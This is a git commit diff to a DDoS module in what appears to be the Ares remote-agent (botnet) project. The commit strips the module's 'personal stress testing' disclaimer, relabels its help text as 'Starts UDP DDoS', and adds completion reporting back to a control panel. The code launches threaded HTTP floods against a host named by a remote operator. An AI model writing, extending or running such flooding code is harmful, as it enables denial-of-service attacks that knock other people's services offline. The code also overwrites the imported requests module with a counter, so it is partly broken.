cf627fd41506feafb46aae343e8383947daa94eb
Wayne Kenney <pythogen@wayne.cool>
2015-12-27 16:03:11 -0500

    ddos.py
    Bug fix: DDoS completion notice now correctly synchronized.

--- agent/modules/ddos.py
+++ agent/modules/ddos.py
@@ -1,9 +1,10 @@
 # Ares DDoS Module
 # Pythogen
 # Working, but not finished.
-# Build 1
+# Build 1.1
 
-# Disclaimer: Not to be used maliciously. Intended for personal server stress testing.
+# Bug fix: DDoS completion notice now correctly synchronized.
+
 
 # Panel command:
 
@@ -19,7 +20,6 @@
 
 import requests
 import time
-from threading import Thread
 import threading
 import pythoncom
 import pyHook
@@ -30,6 +30,7 @@ import sys
 import os
 import string
 
+from threading import Thread
 from urllib import urlopen
 from atexit import register
 from os import _exit
@@ -39,21 +40,43 @@ from sys import stdout, argv
 
 # - Stress functions -
 
+def complete():
+    # Globalize increment variable
+    global inc
+
+    # Announce completion
+    utils.send_output("DDoS Complete.")
+    inc = 0
+
+
 def auto_send_request(server, number_of_requests=10):
+    # Globalize increment variable
+    global inc
+
     for z in range(number_of_requests):
         try:
             urlopen(server)
             # Successful connection
             stdout.write(".") # indicated by period
+            # Increment
+            inc = inc + 1 # Count total requests sent
+            # When all requests have been sent..
+            if inc == (requests):
+                # Process complete
+                complete()
+                
         except IOError:
             # Failed connection
             stdout.write("E") # indicated by E ('Error')
+
+
 
 def flood(url, number_of_requests = 1000, number_of_threads = 50):
     number_of_requests_per_thread = int(number_of_requests/number_of_threads)
     try:
         for x in range(number_of_threads):
             Thread(target=auto_send_request, args=(url, number_of_requests_per_thread)).start()
+
     except:
         stdout.write("\n[E]\n")
     print("\nDone %i requests on %s" % (number_of_requests, url))
@@ -63,7 +86,13 @@ def flood(url, number_of_requests = 1000, number_of_threads = 50):
 # - Command control -
 
 def run(action, num_req):
-    
+    # Globalize increment and request variables
+    global requests
+    global inc
+
+    # inc initially set to 0
+    inc = 0
+
     # If command passed is not 'stop' then it's a host
     if action != "stop":
         utils.send_output("DDoS Started.")
@@ -76,8 +105,6 @@ def run(action, num_req):
         # Call function to begin attack
         flood(server, requests)
 
-        # Specify when complete
-        utils.send_output('DDoS Done.')
 
         # Halt process [unimplemented]
     elif action == "stop":
@@ -92,7 +119,7 @@ def run(action, num_req):
 def help():
     help_text = """
     Usage: ddos [host] [requests]|stop
-    Start HTTP Stress Test
+    Starts UDP DDoS.
 
     """
     return help_text
